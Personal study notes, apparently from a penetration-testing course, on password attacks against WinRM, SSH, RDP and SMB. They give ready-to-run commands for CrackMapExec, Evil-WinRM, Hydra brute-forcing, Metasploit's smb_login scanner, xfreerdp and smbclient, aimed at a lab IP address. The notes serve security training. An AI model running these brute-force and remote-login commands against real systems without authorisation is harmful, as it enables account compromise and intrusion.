A handy tool that we can use for our password attacks is [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the [official documentation](https://web.archive.org/web/20231116172005/https://www.crackmapexec.wiki/) for this tool to become familiar with it.

## WinRM [[Windows Remote Management Protocols]]

It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems. It takes care of the communication between [Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) and the [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).

---
#### CrackMapExec

#### Installing CrackMapExec

```shell-session
sudo apt-get -y install crackmapexec
```

Note: Alternatively, we can install [NetExec](https://github.com/Pennyw0rth/NetExec) to follow along using `sudo apt-get -y install netexec`

#### Using CrackMapExec

Help:

```shell-session
crackmapexec -h
```

CrackMapExec Protocol-Specific Help:

```shell-session
crackmapexec smb -h
```

CrackMapExec Usage:

```shell-session
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

example:
```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

---

For WinRM:
#### Evil-WinRM

Installing Evil-WinRM:

```shell-session
sudo gem install evil-winrm
```

Usage:

```shell-session
evil-winrm -i <target-IP> -u <username> -p <password>
```

example:
```shell-session
evil-winrm -i 10.129.42.197 -u user -p password
```

---
## SSH [[Linux Remote Management Protocols]]

### Using Hydra to bruteforce ssh

```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```

---
## RDP [[Windows Remote Management Protocols]]

Port : 3389
### Using Hydra to bruteforce rdp

```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```

#### xFreeRDP (from linux)

```shell-session
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

example:
```shell-session
xfreerdp /v:10.129.42.197 /u:user /p:password
```

---

## SMB [[SMB]]

#### Hydra - SMB

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```
 may get 
 ```shell-session
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

#### Metasploit Framework

```shell-session
use auxiliary/scanner/smb/smb_login
```
```shell-session
set user_file user.list
```
```shell-session
set pass_file password.list
```
```shell-session
set rhosts 10.129.42.197
```
```shell-session
run
```
#### CrackMapExec

```shell-session
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```


#### Smbclient
```shell-session
smbclient -U user \\\\10.129.42.197\\SHARENAME
```



